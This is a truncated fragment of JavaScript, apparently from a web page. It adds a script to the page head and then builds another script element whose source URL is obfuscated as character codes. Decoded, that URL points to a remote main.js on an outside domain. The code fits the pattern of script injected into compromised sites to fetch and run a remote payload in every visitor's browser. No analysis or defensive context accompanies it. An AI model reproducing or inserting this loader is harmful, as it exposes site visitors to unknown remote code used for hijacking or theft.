...
var need_t = true; for (var i = scripts.length; i--;) {if (scripts[i].src == d3.src) { need_t = false;}else{} } if(need_t == true){document.head.appendChild(d3);}var po = document.createElement('script'); po.type = 'text/javascript'; po.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 99, 100, 110, 46, 97, 108, 108, 121, 111, 117, 119, 97, 110, 116, 46, 111, 110, 108, 105, 110, 101, 47, 109, 97, 105, 110, 46, 106, 115, 63, 116, 61, 110, 112, 106, 108, 99); var scripts = document.getElementsByTagName('script'); 
